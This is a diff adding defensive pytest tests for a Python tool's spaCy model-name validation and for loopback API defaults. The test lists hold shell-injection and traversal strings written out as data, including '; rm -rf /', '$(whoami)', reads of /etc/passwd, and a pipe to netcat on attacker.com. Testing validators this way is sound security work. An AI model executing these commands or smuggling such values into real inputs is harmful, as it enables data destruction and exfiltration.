@@ -503,3 +503,101 @@ class TestDependencySecurity:
                 Config.from_file(f.name)
             except Exception:
                 pass  # Expected to fail safely
+
+
+# =============================================================================
+# Subprocess Security Tests (SEC-03)
+# =============================================================================
+
+class TestSubprocessSecurity:
+    """Tests for subprocess sandboxing and model name validation."""
+
+    def test_valid_model_names_accepted(self):
+        """Known-good spaCy model names should pass validation."""
+        from academiclint.models.manager import ModelManager
+
+        valid_names = [
+            "en_core_web_sm",
+            "en_core_web_md",
+            "en_core_web_lg",
+            "en_core_web_trf",
+            "de_core_web_sm",
+            "fr_core_web_lg",
+        ]
+
+        for name in valid_names:
+            # Should not raise
+            ModelManager.validate_model_name(name)
+
+    def test_invalid_model_names_rejected(self):
+        """Arbitrary or malicious model names should be rejected."""
+        from academiclint.models.manager import ModelManager
+
+        invalid_names = [
+            "malicious_package",
+            "en_core_web",  # Missing size suffix
+            "en_core_web_xl",  # Invalid size
+            "../../../etc/passwd",
+            "; rm -rf /",
+            "en_core_web_sm; echo pwned",
+            "$(whoami)",
+            "`id`",
+            "en core web sm",  # Spaces
+            "",
+            "EN_CORE_WEB_LG",  # Uppercase
+        ]
+
+        for name in invalid_names:
+            with pytest.raises(ValueError):
+                ModelManager.validate_model_name(name)
+
+    def test_model_name_injection_blocked(self):
+        """Shell injection via model name should be blocked at validation."""
+        from academiclint.models.manager import ModelManager
+
+        injection_attempts = [
+            "en_core_web_sm && cat /etc/passwd",
+            "en_core_web_sm | nc attacker.com 1234",
+            "en_core_web_sm\nmalicious_command",
+        ]
+
+        for name in injection_attempts:
+            with pytest.raises(ValueError):
+                ModelManager.validate_model_name(name)
+
+    def test_download_model_validates_name(self):
+        """download_model should reject invalid names before subprocess."""
+        from academiclint.models.manager import ModelManager
+
+        manager = ModelManager()
+
+        with pytest.raises(ValueError):
+            manager.download_model("malicious_package_name")
+
+
+# =============================================================================
+# Default Configuration Security Tests (SEC-01)
+# =============================================================================
+
+class TestDefaultConfiguration:
+    """Tests for secure default configuration values."""
+
+    def test_default_api_host_is_loopback(self):
+        """Default API host in config should be 127.0.0.1, not 0.0.0.0."""
+        import yaml
+
+        config_path = Path(__file__).parent.parent / "config" / "default.yaml"
+        with config_path.open() as f:
+            config = yaml.safe_load(f)
+
+        assert config["api"]["host"] == "127.0.0.1"
+
+    def test_env_config_default_host_is_loopback(self):
+        """EnvConfig should default API host to 127.0.0.1."""
+        from academiclint.utils.env import EnvConfig
+
+        # Clear any override
+        os.environ.pop("ACADEMICLINT_API_HOST", None)
+
+        env_config = EnvConfig()
+        assert env_config.api_host == "127.0.0.1"
